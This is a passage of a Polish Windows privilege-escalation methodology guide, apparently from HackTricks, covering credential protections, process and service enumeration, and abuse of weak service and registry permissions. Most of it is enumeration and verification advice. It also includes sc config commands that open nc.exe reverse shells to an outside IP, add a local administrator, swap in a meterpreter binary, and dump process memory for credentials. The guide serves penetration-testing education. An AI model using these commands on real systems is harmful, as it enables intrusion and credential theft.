**LAPS** służy do **zarządzania hasłami lokalnego Administratora**, zapewniając, że każde hasło jest **unikatowe, losowe i regularnie aktualizowane** na komputerach dołączonych do domeny. Hasła te są bezpiecznie przechowywane w Active Directory i mogą uzyskać do nich dostęp tylko użytkownicy, którym przyznano odpowiednie uprawnienia za pomocą ACL. Uprawnieni użytkownicy mogą wyświetlać hasła lokalnego administratora.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Jeśli ta funkcja jest aktywna, **hasła w postaci jawnego tekstu są przechowywane w LSASS** (Local Security Authority Subsystem Service).\
[**Więcej informacji o WDigest na tej stronie**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

Od **Windows 8.1** firma Microsoft wprowadziła rozszerzoną ochronę Local Security Authority (LSA), aby **blokować** próby **odczytu pamięci** LSA lub wstrzykiwania kodu przez niezaufane procesy, zwiększając tym samym bezpieczeństwo systemu.\
[**Więcej informacji o LSA Protection tutaj**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** został wprowadzony w **Windows 10**. Jego zadaniem jest ochrona danych uwierzytelniających przechowywanych na urządzeniu przed zagrożeniami, takimi jak ataki pass-the-hash. [**Więcej informacji o Credential Guard znajdziesz tutaj.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Buforowane poświadczenia

**Poświadczenia domenowe** są uwierzytelniane przez **Local Security Authority** (LSA) i wykorzystywane przez komponenty systemu operacyjnego. Gdy dane logowania użytkownika zostaną uwierzytelnione przez zarejestrowany pakiet zabezpieczeń, zwykle ustanawiane są poświadczenia domenowe użytkownika.\
[**Więcej informacji o buforowanych poświadczeniach**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Użytkownicy i grupy

### Enumerowanie użytkowników i grup

Sprawdź, czy którakolwiek z grup, do których należysz, ma interesujące uprawnienia.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Uprzywilejowane grupy

Jeśli **należysz do jakiejś uprzywilejowanej grupy, możesz być w stanie eskalować uprawnienia**. Dowiedz się więcej o uprzywilejowanych grupach i o tym, jak je wykorzystać do eskalacji uprawnień:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulowanie tokenami

**Dowiedz się więcej** o tym, czym jest **token**, na tej stronie: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Na poniższej stronie **poznasz interesujące tokeny** i dowiesz się, jak je wykorzystać:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Zalogowani użytkownicy / Sesje

```bash
qwinsta
klist sessions
```

### Foldery domowe

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Zasady dotyczące haseł

```bash
net accounts
```

### Pobierz zawartość schowka

```bash
powershell -command "Get-Clipboard"
```

## Uruchomione procesy

### Uprawnienia do plików i folderów

Przede wszystkim, podczas wyświetlania listy procesów **sprawdź, czy w wierszu poleceń procesu nie ma haseł**.\
Sprawdź, czy możesz **nadpisać jakiś uruchomiony plik binarny** lub czy masz uprawnienia do zapisu w folderze z plikiem binarnym, aby wykorzystać potencjalne [**ataki DLL Hijacking**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Zawsze sprawdzaj, czy nie działają [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Listener debuggera może działać krótko, więc jego brak w pojedynczym pasywnym zrzucie portów nie dowodzi, że nigdy nie był wystawiony. Powiąż każdego zaobserwowanego listenera z jego PID-em, właścicielem procesu oraz możliwością dostępu do niego przez użytkownika o niższych uprawnieniach; sama nazwa aplikacji lub flaga debugowania nie potwierdza możliwości wykonania kodu między użytkownikami. Podczas rutynowego rozpoznania działaj pasywnie i nie wysyłaj poleceń do debuggera.

**Sprawdzanie uprawnień do plików binarnych procesów**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Sprawdzanie uprawnień do folderów plików binarnych procesów (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Katalogi dynamicznych preprocesorów Snort

Snort 2 może ładować biblioteki współdzielone z katalogu `dynamicpreprocessor directory` zadeklarowanego w konfiguracji wybranej za pomocą `snort.exe -c <config>`. W przypadku zaplanowanego zadania lub usługi uruchamiającej Snort na innym koncie sprawdź dokładnie tę konfigurację oraz ACL zadeklarowanego katalogu modułów. Jeśli Twój token pozwala tworzyć tam pliki, ścieżka ta wymaga sprawdzenia pod kątem code execution przy następnym ładowaniu modułów przez to zadanie lub usługę. Zweryfikuj efektywne uprawnienia konta uruchamiającego, aktywną konfigurację, zgodność modułów oraz wszelkie ograniczenia odmowy dostępu lub udziału sieciowego; sam zapis do katalogu nie potwierdza eskalacji. [Dokumentacja dynamicznych preprocesorów Snort](https://www.snort.org/documents/dpx-readme) opisuje ładowanie modułów w czasie działania.

### Uprzywilejowana usługa WWW z zapisywalnym katalogiem dokumentów

W przypadku instalacji Apache w systemie Windows porównaj ścieżkę pliku wykonywalnego usługi i konto, na którym jest uruchamiana, z wartością `DocumentRoot` w aktywnym pliku `httpd.conf`. W typowym układzie XAMPP sprawdź `C:\xampp\apache\conf\httpd.conf` oraz ACL skonfigurowanego katalogu dokumentów, często `C:\xampp\htdocs`. Jeśli użytkownik o niższych uprawnieniach może tworzyć pliki w tym katalogu, a Apache działa jako `LocalSystem`, server-side code execution może przekroczyć granicę uprawnień hosta. Potwierdź, że usługa działa, obsługiwana jest dokładnie ta ścieżka, a handler po stronie serwera przetwarza dany typ pliku; sam zapisywalny katalog potwierdza jedynie możliwość tworzenia plików. Sprawdź ACL bez zapisywania pliku testowego:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

W przypadku standardowej instalacji WAMP usługa może wskazywać na wersjonowany plik `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (lub `C:\wamp\...` w układzie 32-bitowym), a konfiguracja znajduje się obok niego w `conf\httpd.conf`, zaś domyśślnym katalogiem głównym jest `C:\wamp64\www` lub `C:\wamp\www`. Sprawdź jednocześnie dokładną ścieżkę obrazu usługi, tożsamość, z której działa, efektywną wartość `DocumentRoot` (uwzględniając rozwinięcie `${INSTALL_DIR}` i nadpisania konfiguracji virtual hostów) oraz ACL katalogu głównego. Katalog WAMP z prawami zapisu nie dowodzi, że Apache działa jako `SYSTEM` ani że wykona przesłany plik. [Apache opisuje, jak usługa Windows wybiera konfigurację](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Zapisowalny katalog główny IIS i tożsamość puli aplikacji w sieci

W przypadku IIS przyporządkuj fizyczny katalog z prawami zapisu do **aktywnej witryny/aplikacji** w `applicationHost.config`, a następnie ustal skonfigurowaną pulę i handler po stronie serwera. Kod umieszczony w udostępnionym katalogu działa jako pula tylko wtedy, gdy IIS przetwarza dany typ pliku, a trasa jest dostępna. Przed uznaniem zapisywalnego katalogu za możliwość wykonania kodu sprawdź efektywne uprawnienia bieżącego użytkownika do tworzenia plików, stan działania witryny, handler i nadpisania ustawień dla danej ścieżki.

Dynamiczna kompilacja ASP.NET stanowi osobną ścieżkę do sprawdzenia: wygenerowane pliki w katalogu kompilacji aplikacji. Domyślnie jest to katalog `Temporary ASP.NET Files` w ramach odpowiedniej instalacji .NET Framework, ale ustawienie `<compilation tempDirectory>` aplikacji może to zmienić. [Microsoft opisuje lokalizację i podkatalogi poszczególnych aplikacji](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) oraz [zaleca izolowanie katalogów kompilacji, gdy pule aplikacji nie ufają sobie nawzajem](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Jeśli token o niższych uprawnieniach pozwala modyfikować wygenerowany kod źródłowy w pamięci podręcznej **konkretnej** aplikacji, ustal, czy aplikacja ponownie go skompiluje z użyciem bardziej uprzywilejowanej [tożsamości procesu roboczego](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Same ACL pliku lub katalogu nie dowodzą możliwości wykonania kodu: powiąż pamięć podręczną z aktywną aplikacją, efektywnym tokenem i ACL, ustawieniami kompilacji, tożsamością procesu oraz momentem ewentualnej rekompilacji. Korzystaj wyłącznie z przeglądu metadanych w trybie tylko do odczytu; podczas enumeracji nie wyzwalaj kompilacji ani nie modyfikuj plików pamięci podręcznej.

Pula IIS skonfigurowana jako `ApplicationPoolIdentity` lub `NetworkService` zazwyczaj uwierzytelnia się do zasobów domenowych jako **konto komputera hosta**, mimo że jej lokalny token może mieć niskie uprawnienia. `LocalSystem` ma już wysokie uprawnienia lokalne i również używa konta komputera w sieci; `LocalService` zwykle używa anonimowych poświadczeń sieciowych. Pula `SpecificUser` korzysta ze skonfigurowanego konta. [Microsoft opisuje te typy tożsamości](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) oraz [tożsamość puli aplikacji w sieci](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Pominięte ustawienie tożsamości może dziedziczyć wartości domyślne puli, które różnią się w zależności od generacji IIS, dlatego ustal efektywną konfigurację zamiast zgadywać na podstawie nazwy puli. Jeśli wykonanie kodu odbywa się w puli używającej konta komputera w sieci, oceń uprawnienia katalogowe **tego konkretnego komputera**. [DCSync](../active-directory-methodology/dcsync.md) wymaga uprawnień replikacji w kontekście nazewniczym domeny; bilet konta komputera ani rola hosta same w sobie nie dowodzą ich posiadania. Pasywna enumeracja powinna obejmować przegląd konfiguracji i ACL bez przesyłania pliku, nawiązywania uwierzytelnienia sieciowego ani żądania biletów.

W przypadku czytelnego handlera ASP.NET, który uruchamia proces pomocniczy, prześledź wartości pochodzące z żądania przez uwierzytelnianie, odszyfrowywanie, walidację i budowanie polecenia. Handler, który konkatenacją wstawia zdekodowany token do `ProcessStartInfo("cmd", "/c ...")`, może pozwolić metaznakoом powłoki zmienić polecenie; [Microsoft opisuje znaki specjalne `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Ustal, czy niezaufany klient rzeczywiście może wpływać na zdekodowaną wartość i uzyskać dostęp do handlera, a następnie sprawdź efektywną tożsamość puli aplikacji lub tożsamość podszywającą się oraz tożsamość procesu potomnego. Czytelna linia kodu źródłowego, nasłuchujący port localhost lub słabość formatu tokenu same w sobie nie dowodzą możliwości wykonania uprzywilejowanego polecenia. Przeglądaj kod źródłowy i konfigurację puli bez wysyłania sfałszowanych żądań ani uruchamiania procesu pomocniczego podczas pasywnej enumeracji.

W przypadku usługi PHP w systemie Windows ścieżka kontrolowana przez żądanie, przekazana do [`include` lub `require`](https://www.php.net/manual/en/function.include.php), może spowodować wykonanie pliku PHP zapisywalnego przez użytkownika o niższych uprawnieniach z tożsamością procesu roboczego. Potwierdź, że żądanie może dotrzeć do tej instrukcji, rozwiązywana ścieżka wskazuje plik, który użytkownik o niższych uprawnieniach może modyfikować, a proces roboczy odczytywać, odpowiednie ograniczenia ścieżek PHP zezwalają na dołączenie, a proces roboczy rzeczywiście działa z wyższymi uprawnieniami. Nasłuchujący port loopback ani plik z prawami zapisu same w sobie nie dowodzą istnienia tego łańcucha; podczas pasywnej enumeracji sprawdź kod źródłowy, tożsamość usługi i ACL plików, nie wywołując endpointu.

### Pozyskiwanie haseł z pamięci

Możesz utworzyć zrzut pamięci uruchomionego procesu za pomocą **procdump** z sysinternals. Usługi takie jak FTP przechowują **poświadczenia w pamięci w postaci jawnego tekstu**; spróbuj zrzucić pamięć i odczytać poświadczenia.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Niebezpieczne aplikacje GUI

**Aplikacje działające jako SYSTEM mogą umożliwiać użytkownikowi uruchomienie CMD lub przeglądanie katalogów.**

Przykład: „Windows Help and Support” (Windows + F1), wyszukaj „command prompt”, kliknij „Click to open Command Prompt”

### Import plików projektu z podwyższonymi uprawnieniami

Aplikacja, która automatycznie otwiera projekty z katalogu, do którego zapis może mieć użytkownik o niższych uprawnieniach, przekracza granicę zaufania danych wejściowych w kontekście konta importera. Sprawdź **dokładną ścieżkę z prawem zapisu**, proces lub zadanie, które ją otwiera, jego efektywną tożsamość oraz wersję parsera. [Historyczny problem z otwieraniem/przywracaniem projektów Ghidra](https://github.com/NationalSecurityAgency/ghidra/issues/71) umożliwiał użycie zewnętrznych encji XML w metadanych projektu; encja sieciowa w systemie Windows mogła spowodować uwierzytelnienie z konta importera, jeśli [zasady dotyczące wychodzącego SMB i NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) na to pozwalały. To trop wskazujący na możliwość ujawnienia poświadczeń, a nie bezpośrednie uzyskanie uprawnień administratora: odpowiedź musi dać się wykorzystać osobną, autoryzowaną lub podatną ścieżką, a bieżące wersje należy oceniać na podstawie faktycznego stanu poprawek. Podczas pasywnego rozpoznania nie otwieraj spreparowanego projektu; sprawdź przepływ importu i ACL.

## Usługi

Prawo [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) do obiektu Service Control Manager (SCM) jest odrębne od praw dotyczących istniejącej usługi. Pomyślny, tylko do odczytu [żądany poziom dostępu `OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) do tego prawa jest tropem do dalszej analizy, a nie dowodem, że nowa usługa może zostać uruchomiona. [`CreateService` zwraca uchwyt](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) z prawami dostępu do usługi określonymi podczas jej tworzenia; późniejsze ponowne otwarcie usługi wiąże się z osobnym sprawdzeniem dostępu i może się nie powieść, nawet jeśli można użyć pierwotnego uchwytu. Osobno zweryfikuj efektywny token lokalny lub zdalny, przyznane prawa uchwytu, konto usługi, zasady uruchamiania i ścieżkę pliku wykonywalnego. Podczas pasywnego rozpoznania nie twórz ani nie uruchamiaj usługi.

W przypadku zdalnej ścieżki instalacji usługi zestaw te prawa SCM z udziałem na celu, do którego **to samo logowanie sieciowe** może zapisywać, bazowym ACL NTFS oraz lokalną ścieżką do pliku wykonywalnego, który konto usługi może uruchomić. Konto bez uprawnień administratora może przekroczyć tę granicę, jeśli istnieją wyjątkowo szerokie prawa SCM i ścieżka umieszczenia pliku; udział administracyjny nie jest warunkiem koniecznym. Sam dostęp do zapisu w udziale albo sam trop wskazujący na możliwość utworzenia usługi przez SCM nie dowodzi, że nową usługę można uruchomić z wyższą tożsamością.

Istniejąca usługa może wywoływać pomocniczy plik wykonywalny podczas uruchamiania, zamykania lub innego zdarzenia cyklu życia, nawet jeśli tego pliku nie ma w jej `ImagePath`. Jeśli nazwa pomocniczego pliku jest rozwiązywana do katalogu, do którego zapis ma użytkownik o niższych uprawnieniach, a usługa działa z wyższą tożsamością, brakujący plik pomocniczy może być warunkowym kandydatem do podmiany. Potwierdź **faktyczny kod usługi lub udokumentowane wywołanie pomocniczego pliku**, rozwiązaną ścieżkę do pliku wykonywalnego i kolejność wyszukiwania, uprawnienia do tworzenia katalogu, tożsamość usługi oraz dostępny wyzwalacz cyklu życia. Sam katalog usługi z prawem zapisu lub brakujący plik nie dowodzi, że usługa go załaduje; podczas pasywnego przeglądu nie uruchamiaj ani nie zatrzymuj usługi.

W przypadku istniejącej usługi [`SERVICE_START` pozwala przekazać argumenty do `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); jest to odrębne od [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Zanim uznasz prawo do uruchomienia za coś więcej niż prawo do sterowania usługą, sprawdź jej kod lub udokumentowany interfejs. Jeśli usługa używa argumentu wybranego przez wywołującego jako ścieżki logu lub eksportu, zweryfikuj tożsamość usługi, dokładny przepływ argumentu do operacji zapisu, ograniczenia ścieżki oraz uprawnienia do **utworzonego pliku**. Zapis do chronionego katalogu może prowadzić do eskalacji tylko wtedy, gdy istnieje osobny uprzywilejowany proces lub loader, który akceptuje ten plik; sam zapisywalny log lub prawo do uruchomienia nie wystarczą. Podczas pasywnej inwentaryzacji nie uruchamiaj usługi ani nie twórz pliku testowego.

W przypadku agenta monitorującego NSClient++ plik `nsclient.ini`, który można odczytać, jest **tropem do przeglądu konfiguracji**: może zawierać dane logowania do interfejsu webowego, a `boot.ini` może przekierowywać konfigurację do innej lokalizacji. Sprawdź rzeczywiste konto usługi, nasłuch i zasady dostępu WEB oraz to, czy uwierzytelniona rola może zmieniać ustawienia lub skrypty. Wykonanie z podwyższonymi uprawnieniami wymaga dodatkowo `CheckExternalScripts` (lub innej włączonej ścieżki wykonania), efektywnego prawa do zarejestrowania lub zmodyfikowania polecenia oraz wyzwalacza uruchamiającego je z tożsamością usługi. Nasłuch ograniczony do interfejsu loopback nadal może być dostępny dla lokalnego użytkownika, ale sama ścieżka pliku, hasło lub nasłuch nie dowodzą istnienia tych praw. Podczas pasywnego rozpoznania sprawdzaj metadane i uprawnienia, nie wyświetlając sekretów ani nie wywołując API webowego. Zobacz [układ plików NSClient++](https://nsclient.org/docs/concepts/file-layout/), [wskazówki dotyczące bezpieczeństwa interfejsu webowego i skryptów](https://nsclient.org/docs/setup/securing/) oraz [konfigurację skryptów zewnętrznych](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

W przypadku usługi, której `ImagePath` wskazuje `nssm.exe`, sprawdź rzeczywiste konto, na którym działa usługa, oraz wartość `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM przechowuje tam aplikację potomną](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), natomiast `AppDirectory` to skonfigurowany katalog roboczy. Zanim uznasz uprawnienia wrappera za pełny obraz granicy bezpieczeństwa usługi, sprawdź plik wykonywalny aplikacji potomnej i ACL jego katalogów nadrzędnych. Lokalny endpoint WCF lub SOAP udostępniany przez tę aplikację potomną to osobny trop do analizy: potwierdź, że użytkownik o niższych uprawnieniach może dotrzeć do nasłuchu, że konkretna operacja przyjmuje jego dane wejściowe, a aplikacja potomna usługi wykonuje niebezpieczną operację z wyższą tożsamością. Konto usługi, URL endpointu lub ścieżka z prawem zapisu same w sobie nie dowodzą możliwości eskalacji; podczas pasywnego rozpoznania nie wywołuj operacji usługi.

W przypadku niestandardowej operacji WCF prześledź przepływ ciągu znaków kontrolowanego przez wywołującego do dowolnego runspace PowerShell. [`Pipeline.Commands.AddScript` dodaje tekst skryptu](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), a [`Pipeline.Invoke` uruchamia potok](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` z poświadczeniami transportu Windows](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) uwierzytelnia klienta, ale osobno należy sprawdzić uprawnienia do wywołania tej **konkretnej** operacji oraz efektywną tożsamość runspace. Ścieżka od danych wejściowych wywołującego o niższych uprawnieniach do `AddScript` działającego z wyższą tożsamością usługi stanowi granicę wykonania kodu; nasłuchujący port, uwierzytelniony klient lub niewykorzystywana metoda w niepowiązanym zestawie nie są same w sobie dowodem. Podczas rozpoznania statycznie sprawdź wdrożoną usługę, kontrakt, autoryzację i ustawienia impersonacji, nie wywołując endpointu.

Service Triggers umożliwiają Windows uruchamianie usługi po wystąpieniu określonych warunków (aktywność nazwanego potoku/endpointu RPC, zdarzenia ETW, dostępność adresu IP, podłączenie urządzenia, odświeżenie GPO itp.). Nawet bez praw SERVICE_START często można uruchomić uprzywilejowane usługi, wyzwalając ich triggery. Techniki enumeracji i aktywacji znajdziesz tutaj:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Usługa zbierająca dane diagnostyczne Visual Studio

Instalacje Visual Studio z narzędziami C/C++ mogą zawierać `VSStandardCollectorService150` — usługę diagnostyczną skonfigurowaną do działania jako `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) wykorzystywał junction i wyścig z linkiem object managera do przekierowania resetu DACL usługi. Przedstawiona eskalacja wymagała również dostępnej ścieżki naprawy MSI dostawcy WMI Visual Studio Setup oraz pliku docelowego `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Komponent naprawiono w styczniu 2024 r.

Na potrzeby pasywnej wstępnej analizy sprawdź konto i ścieżkę binarną tej usługi, czy istnieje ścieżka do kompilatora Setup WMI oraz stan poprawek zainstalowanego komponentu. Sam wpis usługi, wersja produktu Visual Studio lub plik kompilatora nie dowodzą, że host jest podatny. Do sprawdzenia nie trzeba uruchamiać usługi ani naprawy.

Pobierz listę usług:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Uprawnienia

Możesz użyć **sc**, aby uzyskać informacje o usłudze

```bash
sc qc <service_name>
```

Zaleca się użycie pliku binarnego **accesschk** z pakietu _Sysinternals_ do sprawdzenia wymaganego poziomu uprawnień dla każdej usługi.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Zaleca się sprawdzić, czy grupa „Authenticated Users” może modyfikować jakąkolwiek usługę:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Możesz pobrać accesschk.exe dla XP stąd](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Włącz usługę

Jeśli pojawia się ten błąd (na przykład w przypadku SSDPSRV):

_Błąd systemu 1058._\
_Nie można uruchomić usługi, ponieważ jest wyłączona lub nie ma włączonych urządzeń z nią powiązanych._

Możesz ją włączyć za pomocą

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Weź pod uwagę, że usługa upnphost wymaga do działania usługi SSDPSRV (w przypadku XP SP1)**

**Innym obejściem** tego problemu jest uruchomienie:

```
sc.exe config usosvc start= auto
```

### **Modyfikowanie ścieżki pliku binarnego usługi**

Jeśli grupa „Authenticated users” ma uprawnienie **SERVICE_ALL_ACCESS** do usługi, można zmodyfikować jej plik wykonywalny. Aby zmodyfikować i uruchomić **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Uruchom ponownie usługę

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Uprawnienia można eskalować za pomocą różnych uprawnień:

- **SERVICE_CHANGE_CONFIG**: Umożliwia ponowną konfigurację pliku binarnego usługi.
- **WRITE_DAC**: Umożliwia zmianę uprawnień, co pozwala zmieniać konfigurację usług.
- **WRITE_OWNER**: Umożliwia przejęcie własności i zmianę uprawnień.
- **GENERIC_WRITE**: Zapewnia również możliwość zmiany konfiguracji usług.
- **GENERIC_ALL**: Zapewnia również możliwość zmiany konfiguracji usług.

Do wykrywania i wykorzystywania tej podatności można użyć _exploit/windows/local/service_permissions_.

### Słabe uprawnienia do plików binarnych usług

Jeśli usługa działa jako **`LocalSystem`**, **`LocalService`**, **`NetworkService`** lub uprzywilejowane konto domenowe, ale **użytkownicy z niskimi uprawnieniami mogą modyfikować plik EXE usługi lub jego folder nadrzędny**, często można przejąć usługę, **zastępując plik binarny i ponownie uruchamiając usługę**.

**Sprawdź, czy możesz modyfikować plik binarny uruchamiany przez usługę** albo czy masz **uprawnienia do zapisu w folderze**, w którym znajduje się ten plik ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Możesz pobrać listę wszystkich plików binarnych uruchamianych przez usługę za pomocą **wmic** (nie w system32) i sprawdzić swoje uprawnienia za pomocą **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Możesz również użyć **sc** i **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Szukaj niebezpiecznych ACL przyznanych **`Everyone`**, **`BUILTIN\Users`** lub **`Authenticated Users`**, zwłaszcza uprawnień **`(F)`**, **`(M)`** lub **`(W)`** do pliku wykonywalnego usługi albo katalogu, w którym się on znajduje. Praktyczny scenariusz nadużycia:<sup>[[27]](#references)</sup>

1. Sprawdź konto usługi i ścieżkę do pliku wykonywalnego za pomocą `sc qc <service_name>`.
2. Sprawdź, czy plik binarny jest zapisywalny, za pomocą `icacls <path>`.
3. Zastąp plik binarny usługi payloadem lub prawidłowym, złośliwym plikiem binarnym usługi.
4. Uruchom usługę ponownie za pomocą `sc stop <service_name> && sc start <service_name>` (lub zaczekaj na ponowne uruchomienie systemu / wyzwolenie usługi).

Przydatne automatyczne kontrole:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Jeśli usługa nie pozwala zwykłemu użytkownikowi na jej ponowne uruchomienie, sprawdź, czy uruchamia się automatycznie podczas rozruchu, ma skonfigurowaną akcję ponownego uruchomienia po awarii lub można ją uruchomić pośrednio za pomocą korzystającej z niej aplikacji.

### Uprawnienia do modyfikowania rejestru usług

Sprawdź, czy możesz modyfikować rejestr którejkolwiek usługi.\
Możesz **sprawdzić** swoje **uprawnienia** do **rejestru** usługi, wykonując:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Sprawdź, czy **Authenticated Users** lub **NT AUTHORITY\INTERACTIVE** mają uprawnienia do zapisu w kluczu rejestru konkretnej usługi. Sam wpis ACL nie dowodzi, że dostęp jest efektywny — znaczenie mają wpisy odmowy, bieżący token i uprawnienia dziedziczone. Uprawnienia do klucza rejestru są niezależne od uprawnień `SERVICE_CHANGE_CONFIG` i `SERVICE_START` obiektu usługi. Eskalacja wymaga również użytecznego pola konfiguracji usługi, możliwości jej uruchomienia oraz tożsamości usługi o wyższych uprawnieniach. Zobacz dokumentację firmy Microsoft dotyczącą [uprawnień do kluczy rejestru](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) oraz [uprawnień dostępu do usług](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Aby zmienić ścieżkę do uruchamianego pliku binarnego:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Wyścig symlinków rejestru umożliwiający zapis dowolnej wartości HKLM (ATConfig)

